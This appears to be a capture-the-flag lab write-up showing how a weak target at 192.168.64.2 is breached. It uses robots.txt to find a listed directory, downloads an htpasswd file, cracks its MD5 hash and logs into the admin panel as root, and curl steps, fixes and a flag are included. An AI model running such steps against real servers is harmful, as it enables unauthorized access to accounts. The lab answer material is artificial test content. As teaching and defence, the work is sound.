# Breach #1: Sensitive Data Exposure via robots.txt

## Vulnerability Type
**Information Disclosure + Authentication Bypass**
- OWASP: Security Misconfiguration (A05:2021)
- CWE-200: Exposure of Sensitive Information

## How We Found It

### Step 1: Check robots.txt
Accessed `http://192.168.64.2/robots.txt` and found:
```
User-agent: *
Disallow: /whatever
Disallow: /.hidden
```

### Step 2: Explore Hidden Directory
Navigated to `http://192.168.64.2/whatever/` - directory listing enabled, found `htpasswd` file.

### Step 3: Download Credentials
Downloaded `http://192.168.64.2/whatever/htpasswd`:
```
root:437394baff5aa33daa618be47b75cb49
```

### Step 4: Crack MD5 Hash
Used [CrackStation.net](https://crackstation.net/) to crack the MD5 hash:
- **Result**: `qwerty123@`

### Step 5: Find Admin Panel
Checked common admin location: `http://192.168.64.2/admin/` - login form found.

### Step 6: Login
Used credentials `root:qwerty123@` - **Access granted!**

## How to Exploit

```bash
# 1. Check robots.txt for hidden paths
curl http://192.168.64.2/robots.txt

# 2. Browse disallowed directory
curl http://192.168.64.2/whatever/

# 3. Download htpasswd file
curl http://192.168.64.2/whatever/htpasswd
# Output: root:437394baff5aa33daa618be47b75cb49

# 4. Crack MD5 hash using online tool
# https://crackstation.net/ → qwerty123@

# 5. Login at admin panel
# http://192.168.64.2/admin/
# Username: root, Password: qwerty123@
```

## Security Issues

1. **robots.txt reveals hidden directories** - Should not be used as security mechanism
2. **Directory listing enabled** - Exposes all files in /whatever/
3. **htpasswd in public directory** - Should be outside web root
4. **Weak MD5 hashing** - Easily cracked, no salt
5. **Weak password** - Simple dictionary word with common pattern
6. **Predictable admin path** - /admin/ is too obvious

## How to Fix

1. **Move htpasswd outside web root**:
   ```bash
   mv /var/www/html/whatever/htpasswd /etc/apache2/.htpasswd
   chmod 640 /etc/apache2/.htpasswd
   ```

2. **Disable directory listing**:
   ```apache
   Options -Indexes
   ```

3. **Use strong password hashing** (bcrypt instead of MD5):
   ```bash
   htpasswd -c -B /etc/apache2/.htpasswd root
   ```

4. **Don't put sensitive paths in robots.txt** - Use proper authentication instead

5. **Use non-obvious admin paths** or implement additional security:
   ```apache
   # IP restriction
   Require ip 192.168.1.0/24

   # Rate limiting
   <Limit POST>
       # Prevent brute force
   </Limit>
   ```

## References

- [OWASP Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [CWE-200: Information Disclosure](https://cwe.mitre.org/data/definitions/200.html)
- [Apache htpasswd Documentation](https://httpd.apache.org/docs/2.4/programs/htpasswd.html)

---
**Flag**: `d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff`
